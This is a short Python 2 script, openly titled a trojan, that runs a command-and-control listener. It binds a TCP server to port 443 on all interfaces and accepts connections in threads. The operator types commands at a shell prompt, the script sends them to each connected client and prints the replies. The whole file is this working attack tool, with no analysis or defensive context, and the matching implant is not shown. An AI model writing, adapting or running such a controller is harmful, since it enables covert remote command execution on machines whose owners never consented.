##
# SIMPLE TROJAN PYTHON 
#@author - Jerome Themee - security analyst 
#@date - 16/07/2015
##
import socket
import threading
# socket creation
bind_ip = "0.0.0.0" 
bind_port = 443   

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
server.bind((bind_ip,bind_port))  
server.listen(5)  

# listening
print "############### SIMPLE TROJAN PYTHON #######################"
print "############### @author - Jerome Themee - security analyst #"
print "################### @date - 16/07/2015 #####################\n"
print "[*] Trojan ok - listening on %s:%d" %(bind_ip,bind_port) # say hi !
	
def handle_client(client_socket):
	while True:
			command_shell = raw_input("shell>")
			client_socket.sendall(command_shell)
			#print the client data
			request = client_socket.recv(2048)
			print "shell> %s" % request

#loop for waiting connections
while True: 
	client,addr = server.accept()
	print "[*] Accepted connection from %s:%d" % (addr[0],addr[1])
#threading started
	client_handler = threading.Thread(target=handle_client,args=(client,))
	client_handler.start()
